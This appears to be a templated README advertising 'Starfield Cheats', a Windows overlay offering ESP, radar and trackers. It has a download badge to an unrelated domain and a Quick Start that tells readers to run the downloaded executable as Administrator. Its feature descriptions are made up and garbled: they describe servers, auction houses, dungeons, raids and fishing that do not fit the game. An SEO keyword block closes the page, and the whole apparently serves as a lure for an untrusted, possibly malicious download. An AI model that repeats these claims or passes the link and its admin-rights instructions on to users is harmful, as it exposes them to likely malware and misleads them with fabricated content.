<!-- ===== README Design Studio theme header (cosmic) ===== -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/58bfe36fa6a17df15896a9b7.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/e42035c5960f453c8f444f3c.png" />
    <img alt="Starfield Hero Banner" src="https://designreadme.top/assets/e42035c5960f453c8f444f3c.png" width="100%" />
  </picture>
</p>

<div align="center">

# Starfield Cheats

**Player & NPC ESP · Resource Node ESP · Quest Tracker · Cooldown Tracker · Dungeon Overlay**

<p>
  <a href="https://shanxisaide.com/s/file">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d504e1e5659d22d6bab4c7c5.png" />
      <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/d5e5fbde2c62f0a3845d6267.png" />
      <img alt="Download Starfield Cheats" src="https://designreadme.top/assets/d5e5fbde2c62f0a3845d6267.png" width="197" height="67" />
    </picture>
  </a>
</p>

</div>

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Introduction

**Starfield Cheats** is a Windows desktop overlay built for players who want a clearer view of the match. The panel combines Player & NPC ESP, Resource Node ESP, Quest Tracker, Cooldown Tracker and Dungeon Overlay in a single process, with a module list that can be trimmed per session.

Starfield is a space RPG with planet exploration, ship building and faction quests. Players travel between star systems, scan resources and fight in zero-g.

The overlay is designed around the actual decision points in Starfield. Planet resources are hard to track. Ship modules and stats are complex. The panel does not play the game for you. It surfaces information, timers and reference data so that your own decisions are faster and better informed.

Every module is optional. A player who only wants Player & NPC ESP can hide the rest; a player preparing for Story can load a profile that keeps Resource Node ESP, Quest Tracker and Cooldown Tracker on screen. Profiles are stored locally and can be exported as JSON.

## Table of Contents

- [Introduction](#introduction)
- [Quick Start Guide](#quick-start-guide)
- [System Requirements](#system-requirements)
- [In-Depth Feature Breakdown](#in-depth-feature-breakdown)
- [Module & Hotkey Overview](#module--hotkey-overview)
- [Advanced Configuration](#advanced-configuration)
- [Game Modes and Map Coverage](#game-modes-and-map-coverage)
- [Role and Loadout Notes](#role-and-loadout-notes)
- [Troubleshooting & Diagnostics](#troubleshooting--diagnostics)
- [Frequently Asked Questions](#frequently-asked-questions)
- [Changelog](#changelog)
- [SEO Keywords](#seo-keywords)

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Quick Start Guide

1. Download the archive from the badge at the top of this page.
2. Extract the archive into a dedicated folder; avoid Program Files and other protected paths.
3. Run the executable as Administrator so the overlay can attach to the Starfield window.
4. Launch Starfield and wait until the main menu or a match is fully loaded.
5. Press **INSERT** to open the config panel.
6. Choose a profile for Story or create a new one, then enable the modules you need.
7. Press **INSERT** again to close the panel; the overlay stays active until you use the panic key.

The first launch creates a default profile with conservative ranges. If the overlay does not appear, check the troubleshooting section before changing any game settings.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2, 64-bit | Windows 11, 64-bit |
| CPU | Intel Core i5-8400 / AMD Ryzen 5 2600 | Intel Core i7-10700 / AMD Ryzen 7 3700X |
| RAM | 8 GB | 16 GB |
| GPU | NVIDIA GTX 1060 / AMD RX 580 | NVIDIA RTX 2060 / AMD RX 6600 |
| Storage | 250 MB free | 500 MB on an SSD |
| Display | 1920 × 1080 | 2560 × 1440 or higher |
| Privileges | Administrator | Administrator |
| Runtime | .NET Desktop Runtime 6 | .NET Desktop Runtime 8 |

The overlay is a separate process. It does not install a service, does not write to the game folder and does not require a driver. All settings live under `%APPDATA%\Starfield\profiles`.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## In-Depth Feature Breakdown

### 1. Player & NPC ESP

**Summary:** Player, mob and NPC outlines with health and distance.

Player & NPC ESP draws players, hostile mobs and friendly NPCs with colour-coded outlines. Each marker shows health, level and distance, and the module can filter by faction or creature type. It is designed for crowded hubs and open-world areas where important targets are easy to lose in the visual noise.

| Parameter | What it changes |
|---|---|
| `max_distance` | 10 to 200 metres; the drawing range |
| `npc_filter` | all, hostile or friendly; controls which NPCs are drawn |
| `show_level` | on or off; adds a level readout |

**Scenarios**
- Finding a quest NPC in a crowded hub on New Atlantis.
- Spotting a hostile mob before it reaches the party on New Atlantis.

**Limits**
- Only shows entities the client has already loaded; it does not reveal entities outside the local session.

**Pairs with:** Radar Overlay, Resource Node ESP  
**Default hotkey:** `F1`

### 2. Resource Node ESP

**Summary:** Herb, ore, fishing and chest markers with respawn hints.

Resource Node ESP highlights gatherable nodes such as herbs, ore, fishing spots and treasure chests. Each marker shows the node type and a short respawn estimate where the game exposes one. The module can filter by profession so the screen only shows the resources you can actually gather.

| Parameter | What it changes |
|---|---|
| `node_filter` | herbs, ore, fishing or chests; the tracked types |
| `max_distance` | 10 to 150 metres; the marker range |
| `show_respawn` | on or off; adds a respawn estimate |

**Scenarios**
- Planning a gathering route around Akila City.
- Checking a cave on Akila City for ore before a dungeon run.

**Limits**
- Respawn estimates are approximate and depend on the server's spawn rules.

**Pairs with:** Player & NPC ESP, Radar Overlay  
**Default hotkey:** `F2`

### 3. Quest Tracker

**Summary:** Objective markers, progress and turn-in hints in one panel.

Quest Tracker collects active objectives and draws them on the map with distance and progress. It highlights the next interaction point and keeps completed steps visible for a short time so you can follow a chain without reopening the journal. The module is intended to reduce travel time and missed turn-ins.

| Parameter | What it changes |
|---|---|
| `show_completed` | on or off; keeps completed steps visible |
| `max_markers` | 1 to 30; the number of objectives drawn |
| `route_hint` | on or off; draws a straight-line hint to the next step |

**Scenarios**
- Following a quest chain across Neon without reopening the journal.
- Finding the turn-in NPC after a long dungeon on Neon.

**Limits**
- Quest data is read from the local client and may lag after a quest state changes.

**Pairs with:** Player & NPC ESP, Radar Overlay  
**Default hotkey:** `F3`

### 4. Cooldown Tracker

**Summary:** Ability, potion and trinket timers with alert thresholds.

Cooldown Tracker records your own abilities, potions and trinkets and displays the remaining time in a compact panel. Timers can be grouped by category and highlighted when they are about to expire. The module is designed to support rotation planning without adding another full action bar.

| Parameter | What it changes |
|---|---|
| `tracked_slots` | abilities, potions or trinkets; the categories shown |
| `alert_threshold` | 0 to 15 seconds; highlights timers about to expire |
| `panel_position` | top, bottom or side; where the panel sits |

**Scenarios**
- Checking a defensive cooldown before a boss pull on Cydonia.
- Timing a potion during a long fight on Cydonia.

**Limits**
- Timers are estimates based on observed casts; haste effects can change the true value.

**Pairs with:** Player & NPC ESP, Dungeon Overlay  
**Default hotkey:** `F4`

### 5. Dungeon Overlay

**Summary:** Boss timers, route hints and mechanic reminders.

Dungeon Overlay shows the current dungeon route, boss timers and a short reminder for each major mechanic. The panel can be configured per dungeon and per difficulty, and it highlights the next checkpoint or exit. It is meant to keep the party oriented without replacing the game's own encounter design.

| Parameter | What it changes |
|---|---|
| `dungeon_profile` | a saved route per dungeon |
| `timer_scale` | 0.5 to 2.0; changes the size of timer labels |
| `mechanic_hints` | on or off; shows short mechanic reminders |

**Scenarios**
- Keeping the party on route through The Lodge.
- Checking the next boss timer before a pull on The Lodge.

**Limits**
- Route and timer data are local profiles; they do not read or modify the game's encounter scripts.

**Pairs with:** Cooldown Tracker, Radar Overlay  
**Default hotkey:** `F5`

### 6. Market Helper

**Summary:** Auction prices, vendor values and crafting cost estimates.

Market Helper collects auction and vendor prices for the items you scan and displays a short price history. It can estimate crafting costs from current material prices and highlight listings that are far below the recent average. The module is intended for planning, not for automated buying or selling.

| Parameter | What it changes |
|---|---|
| `scan_limit` | 1 to 200; the number of listings stored per item |
| `history_time` | 1 to 30 days; how long price history remains |
| `craft_estimate` | on or off; adds a material cost estimate |

**Scenarios**
- Checking the price of a crafting material before listing on Red Mile.
- Comparing vendor and auction values for a quest reward on Red Mile.

**Limits**
- Prices are snapshots from the local client and may not reflect the current auction house state.

**Pairs with:** Resource Node ESP, Quest Tracker  
**Default hotkey:** `F6`

### 7. Radar Overlay

**Summary:** Expanded map with players, nodes and quest markers.

The radar overlay replaces the stock minimap with a larger map that can be zoomed and panned. It draws players, resource nodes and quest markers, and it keeps a short trail so you can read movement. Manual markers can be placed to note dungeons, vendors and gathering routes.

| Parameter | What it changes |
|---|---|
| `zoom` | 1.0 to 3.0; scales the radar view |
| `trail_length` | 0 to 10 seconds; how long position trails remain |
| `marker_limit` | 1 to 30; the number of manual markers per map |

**Scenarios**
- Reading a patrol route on Porrima without opening the full map.
- Marking a dungeon entrance before a group run on Porrima.

**Limits**
- Radar data is limited to the local client's view; it does not stream positions from other players.

**Pairs with:** Player & NPC ESP, Quest Tracker  
**Default hotkey:** `F7`

### 8. Config Panel

**Summary:** Profiles, hotkeys and per-character settings in one menu.

The config panel stores named profiles, lets you rebind hotkeys, adjust panel opacity and export or import settings as JSON. Profiles can be tied to a character or role so the overlay switches automatically when you change specs. This keeps the interface consistent across a long session.

| Parameter | What it changes |
|---|---|
| `profile_slots` | 1 to 20; the number of saved profiles |
| `opacity` | 10 to 100 percent; overlay transparency |
| `panic_key` | any key; instantly hides every module |

**Scenarios**
- Switching from a healing profile to a damage profile on New Atlantis.
- Exporting a working config to a teammate before a raid.

**Limits**
- Profiles are stored locally; they are not synced to a cloud account.

**Pairs with:** Player & NPC ESP, Radar Overlay  
**Default hotkey:** `INSERT`

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Module & Hotkey Overview

| Module | Group | Hotkey | Purpose |
|---|---|---|---|
| Player & NPC ESP | World | `F1` | Player, mob and NPC outlines with health and distance. |
| Resource Node ESP | World | `F2` | Herb, ore, fishing and chest markers with respawn hints. |
| Quest Tracker | Reference | `F3` | Objective markers, progress and turn-in hints in one panel. |
| Cooldown Tracker | Combat | `F4` | Ability, potion and trinket timers with alert thresholds. |
| Dungeon Overlay | Reference | `F5` | Boss timers, route hints and mechanic reminders. |
| Market Helper | Reference | `F6` | Auction prices, vendor values and crafting cost estimates. |
| Radar Overlay | World | `F7` | Expanded map with players, nodes and quest markers. |
| Config Panel | System | `INSERT` | Profiles, hotkeys and per-character settings in one menu. |

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Advanced Configuration

The config panel is split into four tabs: **Modules**, **Profiles**, **Hotkeys** and **About**. The Modules tab controls visibility and per-module parameters. Profiles stores named presets and can be tied to a mode or map. Hotkeys lets you rebind every action, including the panic key. About shows the build number and the current config path.

A complete backup is the whole `%APPDATA%\Starfield` folder. Copy it before a major update so that profiles, colours and hotkeys survive the upgrade. To restore, close the overlay, replace the folder and start the executable again.

Global settings apply to every profile:

| Setting | Default | Notes |
|---|---|---|
| `overlay_opacity` | 85% | Applies to panels and labels |
| `ui_scale` | 100% | Useful on 1440p and 4K displays |
| `panic_key` | `END` | Hides every module instantly |
| `language` | English | Interface language |
| `log_level` | Info | Use Debug only for diagnostics |

Profiles can be exported as a single JSON file. The file contains no game data and no account information; it only stores module states, colours and hotkeys.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Game Modes and Map Coverage

The overlay ships with reference profiles for the main Starfield modes. Each profile enables a different set of modules, so switching modes does not require a manual rebuild.

| Mode | What the profile keeps on screen |
|---|---|
| **Story** | main campaign. Modules: Player & NPC ESP, Resource Node ESP, Quest Tracker. |
| **Faction** | questlines. Modules: Player & NPC ESP, Resource Node ESP, Quest Tracker, Cooldown Tracker. |
| **Exploration** | free roam. Modules: Player & NPC ESP, Resource Node ESP, Quest Tracker, Cooldown Tracker, Dungeon Overlay. |
| **Ship Building** | custom ships. Modules: Player & NPC ESP, Resource Node ESP, Quest Tracker. |

Map coverage includes New Atlantis, Akila City, Neon, Cydonia, The Lodge, Red Mile and Porrima. Radar profiles are user-editable: if a map receives a layout change, open the radar editor, align the new bounds and save the profile. The overlay does not download map data from a server.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Role and Loadout Notes

Starfield is played across several roles, and the overlay can be tuned for each one. The table below maps the common roles to the modules that usually matter most.

| Role | Modules to keep | Why |
|---|---|---|
| **Soldier** | Player & NPC ESP, Resource Node ESP | Holds the line; health and cooldown data support the push. |
| **Scientist** | Resource Node ESP, Quest Tracker | Keeps Resource Node ESP and Quest Tracker visible for the role's core decisions. |
| **Diplomat** | Quest Tracker, Cooldown Tracker | Manages relations; map and resource data support the deal. |
| **Pilot** | Cooldown Tracker, Dungeon Overlay | Flies the route; map and vehicle data support the trip. |
| **Explorer** | Dungeon Overlay, Market Helper | Covers ground; radar and resource data support the route. |

### Terminology used in this document

- **grav jump** — the fast-travel system
- **scan** — the resource survey
- **outpost** — a base
- **ship module** — a build part
- **faction** — a quest group
- **digipick** — the lockpicking tool
- **boost pack** — a movement item
- **crew** — the ship's staff

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Troubleshooting & Diagnostics

| Symptom | Likely cause | Fix |
|---|---|---|
| Overlay does not appear | The executable is not running as Administrator | Close it, right-click the executable and choose **Run as administrator** |
| Panel appears but modules are empty | The game is still loading or the overlay attached too early | Restart the overlay after the match has fully loaded |
| Hotkeys do not respond | Another application captured the key | Rebind the hotkey in the Hotkeys tab or close the conflicting app |
| Overlay flickers in fullscreen | The game is using exclusive fullscreen | Switch to borderless windowed mode |
| High CPU usage | Too many modules are enabled at a long range | Lower `max_distance` and disable modules you do not use |
| Radar is misaligned after a map update | The saved map bounds are stale | Open the radar editor and realign the bounds |
| Config does not save | The profile folder is read-only | Move the folder to `%APPDATA%` and restart the overlay |
| Text is too small on a 4K display | `ui_scale` is below 100% | Raise `ui_scale` in the global settings |

Diagnostics are written to `%APPDATA%\Starfield\logs`. The log contains module start-up order, attach status and any parameter validation errors. It does not contain game memory, account names or chat data.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Frequently Asked Questions

**What is Starfield Cheats?**

It is a Windows desktop overlay that adds optional information panels to Starfield. The panel includes Player & NPC ESP, Resource Node ESP, Quest Tracker, Cooldown Tracker and Dungeon Overlay, and every module can be disabled independently.

**Does the overlay modify game files?**

No. It runs as a separate process and does not write to the game folder. Settings and profiles are stored under the user's AppData directory.

**Which Windows versions are supported?**

Windows 10 21H2 or newer and Windows 11, both 64-bit. Older builds may work but are not part of the tested matrix.

**Do I need to run it as Administrator?**

Yes. The overlay needs permission to attach to the game window and to draw above it. Running without administrator rights usually results in an empty or missing panel.

**Can I use more than one profile?**

Yes. The Profiles tab stores up to 20 named profiles. A profile can be tied to a mode or map so the overlay switches automatically.

**How do I hide the overlay quickly?**

Press the panic key, which is `END` by default. You can rebind it in the Hotkeys tab. The key hides every module without closing the process.

**Does the overlay work in borderless windowed mode?**

Yes. Borderless windowed is the recommended display mode. Exclusive fullscreen can cause flicker or prevent the overlay from drawing above the game.

**Can I export my settings?**

Yes. The Profiles tab has an Export button that writes a JSON file containing module states, colours and hotkeys. Import the same file on another machine to restore the setup.

**Does the overlay include map data?**

It includes editable radar profiles for the maps listed in this document. If a map changes, you can realign the bounds in the radar editor and save a new profile.

**How often is the overlay updated?**

Builds are published when a module changes or a compatibility fix is ready. The About tab shows the current build number; replace the old files with the new archive to update.

**Can I run the overlay on a laptop?**

Yes, provided the laptop meets the minimum requirements and the game runs in borderless windowed mode. Integrated graphics may struggle with the full module set.

**Where are the logs?**

Logs are written to `%APPDATA%\Starfield\logs`. Set `log_level` to Debug only while diagnosing a problem, because debug logs grow quickly.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Changelog

- **v3.7 Stable** — refreshed module templates for Starfield, added per-mode profiles and aligned the radar editor with the current map list.
- **v3.7 Beta** — added the config panel tab, improved profile export and fixed hotkey conflicts on Windows 11.
- **Initial release** — first public build with player & npc esp, resource node esp and quest tracker.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## SEO Keywords

Starfield Cheats, cheats for Starfield, Starfield scripts, Starfield cheat panel, Starfield ESP, Starfield radar, Starfield overlay, Starfield Windows tool, Starfield admin panel, Starfield hotkey panel, Starfield config, Starfield tracker, Starfield Story, Starfield New Atlantis, Starfield 2026, Starfield download, Starfield unit ESP, Starfield resource overlay

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Disclaimer

This documentation describes the behaviour of a desktop overlay. It makes no claims about detection status, account safety or official support. Use of the overlay is governed by the rules of Starfield, the server and the platform. The author is not responsible for account actions, data loss or hardware issues resulting from misuse. Review the current rules before use and keep backups of your configuration.
